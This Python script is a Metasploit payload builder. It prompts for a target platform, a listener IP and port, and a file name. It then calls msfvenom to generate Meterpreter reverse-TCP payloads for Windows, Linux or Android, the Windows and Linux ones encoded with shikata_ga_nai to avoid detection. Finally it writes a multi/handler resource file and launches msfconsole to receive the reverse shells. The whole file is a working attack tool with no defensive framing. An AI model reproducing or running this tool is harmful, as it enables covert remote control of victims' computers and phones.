from os import system



logo = """ 
 ██▓███   ▄▄▄     ▓██   ██▓ ██▓     ▒█████   ▄▄▄      ▓█████▄ 
▓██░  ██▒▒████▄    ▒██  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
░▒ ░       ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
░░         ░   ▒   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
               ░  ░░ ░         ░  ░    ░ ░        ░  ░   ░    
                   ░ ░                                 ░      
                                                              
                                                              
                                                              
                                                              
                                                              
                                                              
                                                              
                                                              
                                                              
                                                              
"""




print(logo)





os = input("Targeted Platform [W]indows/[L]inux/[A]ndroid: ")
ip = input("Listener's IP: ")
port = input("Listener's Port: ")
save = input("Saving Directory: ")
name = input("Payload Name: ")


if os == "W":
	payload = "windows/meterpreter/reverse_tcp"
	formation = "exe"
	platform = "Windows"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}{5}.{6}".format(platform, payload, ip, port, save, name, formation)

if os == "L":
	payload = "linux/meterpreter/reverse_tcp"
	formation = "sh"
	platform = "Linux"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} -e 'x86/shikata_ga_nai' -i 10 X > {4}{5}.{6}".format(platform, payload, ip, port, save, name, formation)

if os == "A":
	payload = "android/meterpreter/reverse_tcp"
	formation = "apk"
	platform = "Android"
	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} X > {4}{5}.{6}".format(platform, payload, ip, port, save, name, formation)
system(command)
print("Payload Created.")

handler_file = "{0}handler.rc".format(save)
f = open(handler_file, 'a')
handler_options = """use multi/handler
		set PAYLOAD {0}
		set LHOST {1}
		set LPORT {2}
		set ExitOnSession false
		exploit -j""".format(payload, ip, port)

f.write(handler_options)
f.close()
handler = "msfconsole -r {0}".format(handler_file)
system(handler)
